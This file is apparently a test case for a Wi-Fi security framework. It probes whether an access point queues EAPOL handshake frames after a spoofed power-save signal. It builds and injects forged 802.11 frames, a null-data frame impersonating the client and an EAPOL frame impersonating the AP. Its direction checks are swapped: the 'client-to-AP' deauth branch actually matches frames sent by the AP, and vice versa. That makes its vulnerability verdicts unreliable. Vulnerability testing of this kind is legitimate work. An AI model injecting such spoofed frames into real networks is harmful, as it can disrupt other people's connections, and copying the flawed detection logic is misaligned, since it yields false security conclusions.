# test_queue_4way_sleep.py
# Place in your tests folder and run with: ./run.py wlan1 queue-4way-sleep
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test

# scapy layers we use:
# Dot11, Dot11Deauth, Dot11AssoReq, Dot11Elt, Dot11QoS, LLC, SNAP, EAPOL, Raw


class Queue4WaySleep(Test):
    """
    Test for AP behaviour described in 4.3.1:
    1) spoof a null-data frame from the client with the sleep bit set (kernel thinks client asleep)
    2) attempt to cause / observe the AP queuing data (EAPOL) destined to the client
    3) detect client handshake timeout -> client deauth
    Detection heuristics:
      - if we observe the client sending a deauthentication after timeout AND
        we did NOT observe an EAPOL frame over-the-air to the client in the same window,
        the AP is likely buffering the EAPOL (vulnerable).
      - if we observe AP-originated EAPOL/data destined to client on the air, then the AP is
        transmitting — not vulnerable (w.r.t. this behaviour).
    """
    name = "queue-4way-sleep"
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            # 0: send spoofed null-data (from victim -> AP) with sleep-bit set
            Action(trigger=Trigger.Connected, action=Action.Inject),
            # 1: shortly after, inject a spoofed EAPOL data frame (as if AP -> client)
            #    (we send this to help force/observe EAPOL behaviour; real AP may also send)
            Action(trigger=Trigger.Connected, action=Action.Inject),
            # 2: listen for EAPOL frames on the air (AP -> client)
            Action(trigger=Trigger.Connected, action=Action.Receive),
            # 3: listen for deauthentication frames (client -> AP or AP -> client)
            Action(trigger=Trigger.Connected, action=Action.Receive),
            # 4: terminate after timeout
            Action(trigger=Trigger.Connected, action=Action.Terminate)
        ])

        # internal state used by detection logic
        self.eapol_seen = False        # saw an EAPOL destined to client on air
        self.client_deauth_seen = False
        self.null_injected = False

    def receive(self, station, frame):
        # only consider frames for this test's BSS / station
        if not frame.haslayer(Dot11):
            return False

        addr1 = frame[Dot11].addr1
        addr2 = frame[Dot11].addr2

        # ignore frames unrelated to the pair
        if addr1 != station.mac and addr2 != station.mac and addr1 != station.bss and addr2 != station.bss:
            return False

        # 1) Detect EAPOL frames from AP -> client (on-the-air)
        if frame.haslayer(EAPOL):
            # EAPOL sent to client (addr1 == station.mac) from AP (addr2 == station.bss)
            if frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
                log(STATUS, "Detected EAPOL/data frame on-air destined to client: %s" % frame.summary(),
                    color="green")
                self.eapol_seen = True
                # Seeing EAPOL on the air suggests AP did transmit; that is a sign of *not* vulnerable
                return True

        # 2) Detect deauthentication frames (either direction)
        if frame.haslayer(Dot11Deauth):
            # If client sent a deauth (addr2 == AP), that indicates the client's handshake timed out.
            if frame[Dot11].addr2 == station.bss and frame[Dot11].addr1 == station.mac:
                log(STATUS, "Detected deauthentication frame from client (client->AP): %s" % frame.summary(),
                    color="orange")
                self.client_deauth_seen = True
                # decide vulnerability now: if client deauthed and we DID NOT see EAPOL on-air,
                # the AP probably queued the handshake and the client timed out.
                if not self.eapol_seen:
                    log(STATUS, "Heuristic: client deauth seen WITHOUT observed EAPOL -> AP LIKELY VULNERABLE",
                        color="red")
                else:
                    log(STATUS, "Client deauth seen but EAPOL was observed on-air -> ambiguous / not reproduced",
                        color="yellow")
                return True

            # If AP sent a deauth to client (addr2 == client), but the AP's deauth is not observed by client,
            # that's another sign of buffered frames — we log it.
            if frame[Dot11].addr2 == station.mac and frame[Dot11].addr1 == station.bss:
                log(STATUS, "Detected deauthentication frame from AP (AP->client) on-air: %s" % frame.summary(),
                    color="blue")
                # If AP deauth observed but client didn't disconnect immediately, ambiguous.
                return True

        return False

    def generate(self, station):
        """
        Build and schedule frames:
          - spoofed null-data from client -> AP with sleep bit set (cause kernel to mark asleep)
          - (optionally) a spoofed EAPOL data frame from AP -> client, to force/observe data behavior
        """

        # ---------- 1) Spoofed NULL-DATA with sleep-bit (from client to AP) ----------
        null_frame = Dot11(type="Data", subtype=4, addr1=station.bss,
                           addr2=station.mac, addr3=station.bss)
        # set the power-save / privacy-management flag (pw-mgt / sleep bit)
        null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield
        # No payload (null function)
        self.actions[0].set_frame(null_frame, mon=True, encrypt=False)
        self.actions[0].set_delay(delay=1)
        self.null_injected = True
        log(DEBUG, "Scheduled spoofed null-data with sleep-bit (from client -> AP) after 1s", color="cyan")

        # ---------- 2) Spoofed EAPOL data frame (from AP -> client) ----------
        # We send a synthetic EAPOL frame from AP -> client to observe whether it reaches the air / client.
        # This helps infer whether AP is transmitting or buffering. This is optional and should be safe
        # on test networks; adjust payload as needed.
        eapol_payload = EAPOL(version=1, type=3) / \
            Raw(load=b'\x00' * 60)  # synthetic body
        # Data frame: from AP to client
        eapol_frame = Dot11(type="Data", addr1=station.mac,
                            addr2=station.bss, addr3=station.bss)
        # LLC/SNAP header to carry EtherType 0x888e (EAPOL)
        eapol_frame = eapol_frame / LLC() / SNAP() / eapol_payload

        self.actions[1].set_frame(eapol_frame, mon=True, encrypt=False)
        # send after a small delay (give kernel time to mark asleep and AP to possibly queue)
        self.actions[1].set_delay(delay=2)
        log(DEBUG, "Scheduled synthetic EAPOL (spoofed AP->client) after 2s", color="cyan")

        # ---------- 3) Receive EAPOL on-air (to determine AP transmitted) ----------
        # This receive will call self.receive and set mon=True so we can capture all frames.
        self.actions[2].set_receive(self.receive, mon=True)

        # ---------- 4) Receive Deauthentication frames (to detect client timeout/disconnect) ----------
        self.actions[3].set_receive(self.receive, mon=True)

        # ---------- 5) Exit after an observation window ----------
        # Allow enough time for the handshake timeout and deauthentication to take place.
        # Increase timeout if needed for slow clients/APs.
        self.actions[4].set_delay(delay=6)
        log(STATUS, "Test scheduled. Observation window set to 6s. Watch logs for vulnerability heuristic.", color="green")
